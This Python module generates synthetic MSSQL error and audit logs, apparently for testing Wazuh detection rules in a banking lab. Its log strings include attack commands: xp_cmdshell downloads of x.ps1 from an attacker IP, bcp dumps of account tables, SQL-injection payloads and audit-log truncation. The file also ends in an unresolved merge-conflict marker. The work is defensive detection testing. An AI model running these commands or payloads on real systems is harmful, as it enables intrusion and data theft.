"""
Microsoft SQL Server audit / error-log generator.

Wazuh ships generic decoders for MSSQL ERRORLOG. We produce realistic
ERRORLOG lines plus audit entries that trigger:

  - Login failed for user                    -> rule family 60123 + custom
  - sa account use                           -> high-severity rule
  - sysadmin role membership change          -> privilege escalation
  - xp_cmdshell execution                    -> command exec via DB

NEW: uses generators.shared_state so the same attacker IP that brute-forces
SSH and AD also appears here as "Login failed for user 'sa' ... [CLIENT: <ip>]"
and the same scenario victim user shows up running xp_cmdshell / role changes
on the scenario target database.
"""
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    USERNAMES, INTERNAL_IPS, ATTACKER_IPS,
    DATABASES_BANKING, DATABASES_SENSITIVE,
    pick_normal_user, pick_noisy_user,
    rand_recent, pick, maybe,
)
from .shared_state import INCIDENTS


# MSSQL ERRORLOG uses local-time stamps:  "2026-05-11 10:30:45.12"
def _ts(ts):
    return ts.strftime("%Y-%m-%d %H:%M:%S.") + f"{ts.microsecond // 10000:02d}"


# =========================================================================
# Line builders
# =========================================================================
def _login_success(ts, user=None, ip=None):
    user = user or pick_normal_user()["username"]
    ip = ip or pick(INTERNAL_IPS)
    return (f"{_ts(ts)} Logon       Login succeeded for user '{user}'. "
            f"Connection made using SQL Server authentication. "
            f"[CLIENT: {ip}]")


def _login_success_windows(ts, user=None, ip=None):
    user = user or pick_normal_user()["username"]
    ip = ip or pick(INTERNAL_IPS)
    return (f"{_ts(ts)} Logon       Login succeeded for user 'BANK\\{user}'. "
            f"Connection made using Windows authentication. "
            f"[CLIENT: {ip}]")


def _login_failed(ts, user=None, ip=None, reason="password"):
    user = user or pick(USERNAMES)
    ip = ip or pick(INTERNAL_IPS)
    if reason == "password":
        msg = "Password did not match that for the login provided."
    elif reason == "no_user":
        msg = "Could not find a login matching the name provided."
    elif reason == "expired":
        msg = "The login's password has expired."
    elif reason == "disabled":
        msg = "Login is disabled."
    else:
        msg = "Login failed."
    return (f"{_ts(ts)} Logon       Login failed for user '{user}'. "
            f"Reason: {msg} [CLIENT: {ip}]")


def _xp_cmdshell(ts, user=None, cmd=None):
    user = user or pick(["sa", "admin", "svc_sql"])
    cmd = cmd or pick([
        "whoami",
        "net user",
        "net group \"Domain Admins\" /domain",
        "ipconfig /all",
        "powershell -enc SQBFAFgA",
        "curl http://185.220.101.45/x.ps1 -o c:\\temp\\x.ps1",
        "bcp \"SELECT * FROM CORE_BANKING.dbo.accounts\" queryout c:\\temp\\dump.csv -c -T",
        "wmic process list brief",
    ])
    spid = random.randint(50, 99)
    return (f"{_ts(ts)} spid{spid}      User '{user}' executed: "
            f"EXEC xp_cmdshell '{cmd}';")


def _role_change(ts, actor=None, target=None, role="sysadmin"):
    actor = actor or pick(["sa", "dbadm1"])
    target = target or pick(USERNAMES)
    spid = random.randint(50, 99)
    return (f"{_ts(ts)} spid{spid}      User '{actor}' added member '{target}' "
            f"to server role '{role}'.")


def _grant_permission(ts, actor, target_user, db):
    spid = random.randint(50, 99)
    perm = pick(["SELECT", "INSERT, UPDATE, DELETE",
                 "EXECUTE", "ALTER ANY LOGIN", "CONTROL SERVER"])
    return (f"{_ts(ts)} spid{spid}      User '{actor}' executed: "
            f"GRANT {perm} ON DATABASE::{db} TO [{target_user}];")


def _backup(ts):
    db = pick(DATABASES_BANKING)
    return (f"{_ts(ts)} Backup      Database backed up. Database: {db}, "
            f"creation date(time): 2025-01-01(12:00:00), pages dumped: "
            f"{random.randint(1000, 50000)}, first LSN: 1234:5678:1, "
            f"last LSN: 1234:5678:2, full backup")


def _suspicious_select(ts, user=None, db=None):
    """SQL injection / data exfiltration pattern (UNION SELECT on sys tables)."""
    user = user or pick(USERNAMES)
    db = db or pick(DATABASES_SENSITIVE)
    spid = random.randint(50, 99)
    payload = pick([
        f"SELECT * FROM {db}.dbo.accounts WHERE 1=1 UNION SELECT name, password_hash FROM sys.sql_logins; -- ",
        f"SELECT * FROM {db}.dbo.customers WHERE id=1 OR 1=1 -- ",
        f"SELECT TOP 100000 card_number, cvv, expiry FROM {db}.dbo.card_data",
        f"SELECT * FROM information_schema.tables WHERE table_catalog='{db}'",
        f"EXEC sp_executesql N'SELECT * FROM sys.databases'",
    ])
    return (f"{_ts(ts)} spid{spid}      Query executed by '{user}': {payload}")


def _normal_query_log(ts, user=None, db=None):
    """Realistic banking transaction queries (no alert; just baseline noise)."""
    user = user or pick_normal_user()["username"]
    db = db or pick(DATABASES_BANKING)
    spid = random.randint(50, 99)
    q = pick([
        f"SELECT TOP 50 * FROM {db}.dbo.transactions WHERE account_id=@p1 ORDER BY ts DESC",
        f"UPDATE {db}.dbo.accounts SET balance=balance-@p1 WHERE account_id=@p2",
        f"INSERT INTO {db}.dbo.audit_log (user_id, action, ts) VALUES (@p1, 'transfer', GETUTCDATE())",
        f"SELECT COUNT(*) FROM {db}.dbo.sessions WHERE expires_at > GETUTCDATE()",
        f"EXEC sp_GetCustomerBalance @customer_id=@p1",
    ])
    return (f"{_ts(ts)} spid{spid}      Query executed by '{user}': {q}")


def _schema_change(ts, actor=None, db=None):
    """Unauthorized schema change — table drop / new table creation."""
    actor = actor or pick(["sa", "dbadm1"])
    db = db or pick(DATABASES_SENSITIVE)
    spid = random.randint(50, 99)
    ddl = pick([
        f"DROP TABLE {db}.dbo.fraud_alerts",
        f"CREATE TABLE {db}.dbo.tmp_export (data nvarchar(max))",
        f"ALTER TABLE {db}.dbo.customers DROP COLUMN ssn",
        f"TRUNCATE TABLE {db}.dbo.audit_log",
    ])
    return (f"{_ts(ts)} spid{spid}      User '{actor}' executed: {ddl}")


def _server_event(ts, msg):
    return f"{_ts(ts)} Server      {msg}"


# =========================================================================
# Main generator
# =========================================================================
def generate(path: Path, count: int = 40) -> None:
    events = []

    # --- Baseline normal traffic --------------------------------------
    for _ in range(count // 2):
        ts = rand_recent(60)
        events.append((ts, _login_success(ts)))

    for _ in range(count // 3):
        ts = rand_recent(60)
        events.append((ts, _login_success_windows(ts)))

    for _ in range(count):
        ts = rand_recent(60)
        events.append((ts, _normal_query_log(ts)))

    # Regular backups
    for _ in range(5):
        ts = rand_recent(120)
        events.append((ts, _backup(ts)))

    # ----------------------------------------------------------------
    # SCENARIO-DRIVEN: brute-force from each incident's attacker IP,
    # then suspicious activity by the scenario's victim user.
    # ----------------------------------------------------------------
    for incident in INCIDENTS:
        attacker_ip = incident["attacker_ip"]
        victim_user = incident["victim_user"]
        target_db   = incident["target_db"]

        # 12-18 rapid failed logins as 'sa' from the attacker IP
        base = rand_recent(25)
        n_attempts = random.randint(12, 18)
        for i in range(n_attempts):
            ts = base + timedelta(seconds=i * 2)
            events.append((ts, _login_failed(
                ts, user="sa", ip=attacker_ip, reason="password")))

        # A couple of "no such user" probes as attacker tries common names
        for u in ["administrator", "admin", victim_user]:
            ts = base + timedelta(seconds=n_attempts * 2 + random.randint(1, 5))
            events.append((ts, _login_failed(
                ts, user=u, ip=attacker_ip, reason="no_user")))

        # Eventually a SUCCESS from the same IP for the scenario victim
        ts = base + timedelta(seconds=n_attempts * 2 + 30)
        events.append((ts, _login_success(ts, user=victim_user, ip=attacker_ip)))

        # If victim is privileged enough, run dangerous queries
        if incident["victim_priv"] in ("admin", "manager", "service"):
            # Privilege grant
            ts = base + timedelta(seconds=n_attempts * 2 + 60)
            events.append((ts, _role_change(
                ts, actor=victim_user, target=victim_user, role="sysadmin")))

            # Grant data access on sensitive DB
            ts = base + timedelta(seconds=n_attempts * 2 + 75)
            events.append((ts, _grant_permission(
                ts, victim_user, victim_user, target_db)))

            # xp_cmdshell — recon
            ts = base + timedelta(seconds=n_attempts * 2 + 90)
            events.append((ts, _xp_cmdshell(
                ts, user=victim_user, cmd="whoami /priv")))

            # xp_cmdshell — exfil
            ts = base + timedelta(seconds=n_attempts * 2 + 100)
            events.append((ts, _xp_cmdshell(
                ts, user=victim_user,
                cmd=f"bcp \"SELECT * FROM {target_db}.dbo.accounts\" "
                    f"queryout c:\\temp\\exfil.csv -c -T")))

            # xp_cmdshell — second-stage payload from attacker IP
            ts = base + timedelta(seconds=n_attempts * 2 + 120)
            events.append((ts, _xp_cmdshell(
                ts, user=victim_user,
                cmd=f"powershell -c \"Invoke-WebRequest http://{attacker_ip}/x.ps1 -OutFile c:\\temp\\x.ps1\"")))

            # Suspicious SELECT against sensitive DB (exfil signature)
            ts = base + timedelta(seconds=n_attempts * 2 + 140)
            events.append((ts, _suspicious_select(
                ts, user=victim_user, db=target_db)))

            # Cover tracks — truncate the audit log
            ts = base + timedelta(seconds=n_attempts * 2 + 160)
            events.append((ts, _schema_change(
                ts, actor=victim_user, db="AUDIT_LOG")))

    # ----------------------------------------------------------------
    # STANDALONE attacks (rule coverage)
    # ----------------------------------------------------------------

    # Scattered routine failed logins (typos / expired passwords)
    for _ in range(6):
        ts = rand_recent(60)
        events.append((ts, _login_failed(ts)))
    for _ in range(3):
        ts = rand_recent(60)
        events.append((ts, _login_failed(ts, reason="no_user")))
    for _ in range(2):
        ts = rand_recent(60)
        events.append((ts, _login_failed(ts, reason="expired")))

    # Random standalone suspicious activity (not tied to scenarios)
    for _ in range(3):
        ts = rand_recent(20)
        events.append((ts, _xp_cmdshell(ts)))

    ts = rand_recent(15); events.append((ts, _suspicious_select(ts)))
    ts = rand_recent(15); events.append((ts, _role_change(ts)))
    ts = rand_recent(15); events.append((ts, _schema_change(ts)))

    # Sort and write
    events.sort(key=lambda x: x[0])
    with path.open("w", encoding="utf-8") as f:
        for _, line in events:
            f.write(line + "\n")

    print(f"  wrote {len(events)} MSSQL events -> {path.name}")
    print(f"  scenario-driven MSSQL chains: {len(INCIDENTS)} "
<<<<<<< HEAD
          f"(attackers: {[i['attacker_ip'] for i in INCIDENTS]})")
=======
          f"(attackers: {[i['attacker_ip'] for i in INCIDENTS]})")
>>>>>>> d68c8a668708ebedb9c21ffe916cb3b47f909f47
